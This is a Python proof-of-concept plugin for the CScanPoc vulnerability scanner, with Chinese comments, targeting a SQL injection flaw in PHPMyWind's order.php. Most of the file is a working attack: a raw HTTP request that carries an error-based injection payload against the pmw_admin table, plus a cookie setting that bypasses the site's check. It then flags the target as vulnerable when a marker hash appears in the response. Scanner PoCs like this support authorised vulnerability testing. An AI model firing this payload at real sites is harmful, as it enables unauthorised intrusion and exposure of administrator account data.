# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'PHPMyWind_0012'  # 平台漏洞编号，留空
    name = 'PHPMyWind SQL注射'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-01-07'  # 漏洞公布时间
    desc = '''
        PHPMyWind 是一款基于PHP+MySQL开发，符合W3C标准的建站引擎。
        漏洞出在/order.php中，
        $r = $dosql->GetOne("SELECT `$colname` FROM `$tbname2` WHERE `id`=".$_GET['id']);//没过滤
        绕过也很简单，Cookie设置一下即可。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/1442/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPMyWind'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '75114b23-41fe-40bb-a1d0-49a4354cd4c5'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            o = urllib.parse.urlparse(self.target)
            raw = '''
GET /order.php?id=-@`'`%20UnIon%20select%20username%20from%20`pmw_admin`%20where%20(select%201%20from%20(select%20count(*)%20,concat(0x7c,(select%20concat(username,0x3a,md5(c))%20from%20pmw_admin%20limit%200,1),0x7c,floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x%20limit%200,1)a)%20and%20id=@`'` HTTP/1.1
Host: {host}
Cookie: shoppingcart=a;username=b
            '''.format(host=o.hostname)

            code, head, body, errcode, final_url = hh.http(
                self.target, raw=raw)
            if code == 200 and '4a8a08f09d37b73795649038408b5f33' in body:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
